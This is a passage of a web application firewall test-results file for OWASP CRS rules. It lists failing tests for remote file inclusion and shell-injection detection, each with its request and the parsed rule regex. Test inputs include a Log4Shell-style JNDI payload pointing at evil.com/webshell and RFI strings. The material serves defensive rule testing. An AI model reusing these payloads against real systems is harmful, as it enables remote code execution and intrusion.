          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "normalizePathWin"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "OS File Access Attempt"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-lfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-LFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/126"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.lfi_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "931100",
    "test_id" : 3,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931100.yaml",
    "description" : "Remote File Inclusion Attack (931100) - POST XML",
    "cause" : "failed expect_id check: 931100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=1 rule_id=920620 - Multiple Content-Type Request Headers", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=933190 - PHP Injection Attack: PHP Closing Tag Found", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Remote File Inclusion Attack (931100) - POST XML",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Host" : "localhost",
            "Keep-Alive" : "300",
            "Referer" : "http",
            "User-Agent" : "OWASP CRS test agent",
            "Content-type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/api/",
          "data" : "<?xml version=\"1.0\" encoding=\"UTF-8\"?><catalog><tag>ftp%3A%2F%2F1.1.1.1</tag></catalog>",
          "port" : 80,
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 931100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 931100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule Logic ]=-"
        }, {
          "type" : "Comment",
          "text" : " These rules look for common types of Remote File Inclusion (RFI) attack methods."
        }, {
          "type" : "Comment",
          "text" : "\t- URL Contains an IP Address"
        }, {
          "type" : "Comment",
          "text" : "\t- The PHP \"include()\" Function"
        }, {
          "type" : "Comment",
          "text" : "\t- RFI Data Ends with Question Mark(s) (?)"
        }, {
          "type" : "Comment",
          "text" : "\t- RFI Host Doesn't Match Local Host"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Note: brackets around IPv6 literals are mandatory per RFC 2732,"
        }, {
          "type" : "Comment",
          "text" : " but have been made optional here - just in case - to account for rare"
        }, {
          "type" : "Comment",
          "text" : " non-standard implementations or parsing inconsistencies."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ References ]=-"
        }, {
          "type" : "Comment",
          "text" : " http://projects.webappsec.org/Remote-File-Inclusion"
        }, {
          "type" : "Comment",
          "text" : " http://tacticalwebappsec.blogspot.com/2009/06/generic-remote-file-inclusion-attack.html"
        }, {
          "type" : "Comment",
          "text" : " https://datatracker.ietf.org/doc/html/rfc2732"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)^(file|ftps?|https?|ssh)://(?:\\[?[a-f0-9]+:[a-f0-9:]+\\]?|\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 931100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Remote File Inclusion (RFI) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/175/253"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rfi_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "931130",
    "test_id" : 9,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931130.yaml",
    "description" : "Matching hosts",
    "cause" : "failed no_expect_ids check: 931130 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Matching hosts",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "example.com",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=https://example.com/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 931130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 931130,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " url:file:// can be used by Java applications using"
        }, {
          "type" : "Comment",
          "text" : " org.apache.commons.io.IOUtils to access internal files, so this has been added"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has one (stricter) sibling: 931131."
        }, {
          "type" : "Comment",
          "text" : " That rule applies the same regular expression to the request filename in phase 1."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/931130.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 931130"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:(?:url|jar):)?(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://?(?:[^@]+@)?([^/]*)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 931130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/175/253"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rfi_parameter_%{MATCHED_VAR_NAME}=.%{tx.1}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "931130",
    "test_id" : 11,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931130.yaml",
    "description" : "Subdomains",
    "cause" : "failed no_expect_ids check: 931130 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Subdomains",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "example.com",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=http://www.example.com/some/path",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 931130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 931130,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " url:file:// can be used by Java applications using"
        }, {
          "type" : "Comment",
          "text" : " org.apache.commons.io.IOUtils to access internal files, so this has been added"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has one (stricter) sibling: 931131."
        }, {
          "type" : "Comment",
          "text" : " That rule applies the same regular expression to the request filename in phase 1."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/931130.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 931130"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:(?:url|jar):)?(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://?(?:[^@]+@)?([^/]*)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 931130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/175/253"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rfi_parameter_%{MATCHED_VAR_NAME}=.%{tx.1}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "931130",
    "test_id" : 15,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931130.yaml",
    "description" : "basic auth",
    "cause" : "failed no_expect_ids check: 931130 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "basic auth",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "example.com",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=http://foo:bar@example.com/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 931130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 931130,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " url:file:// can be used by Java applications using"
        }, {
          "type" : "Comment",
          "text" : " org.apache.commons.io.IOUtils to access internal files, so this has been added"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has one (stricter) sibling: 931131."
        }, {
          "type" : "Comment",
          "text" : " That rule applies the same regular expression to the request filename in phase 1."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/931130.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 931130"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:(?:url|jar):)?(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://?(?:[^@]+@)?([^/]*)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 931130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/175/253"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rfi_parameter_%{MATCHED_VAR_NAME}=.%{tx.1}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932130",
    "test_id" : 6,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932130.yaml",
    "description" : "Log4J exploit picked up by shell exploit detection in body",
    "cause" : "failed expect_id check: 932130 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "Log4J exploit picked up by shell exploit detection in body",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"${:1337:-x$}{jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix shell expressions ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Detects the following patterns which are common in Unix shell scripts"
        }, {
          "type" : "Comment",
          "text" : " and one-liners:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " $(foo)    Command substitution"
        }, {
          "type" : "Comment",
          "text" : " ${foo}    Parameter expansion"
        }, {
          "type" : "Comment",
          "text" : " <(foo)    Process substitution"
        }, {
          "type" : "Comment",
          "text" : " >(foo)    Process substitution"
        }, {
          "type" : "Comment",
          "text" : " $((foo))  Arithmetic expansion"
        }, {
          "type" : "Comment",
          "text" : " $[2+2]    Arithmetic expansion"
        }, {
          "type" : "Comment",
          "text" : " /e[t]c    Shell glob expression to bypass wordlists"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has a stricter sibling: 932131 (PL2) that applies the same regex to User-Agent and Referer"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is essential to defend against the Log4J / Log4Shell attacks (see also rule 944150)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932130.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932130"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\$(?:\\((?:.*|\\(.*\\))\\)|\\{.*\\}|\\[.*\\])|[<>]\\(.*\\)|/[0-9A-Z_a-z]*\\[!?.+\\]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Shell Expression Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 10,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
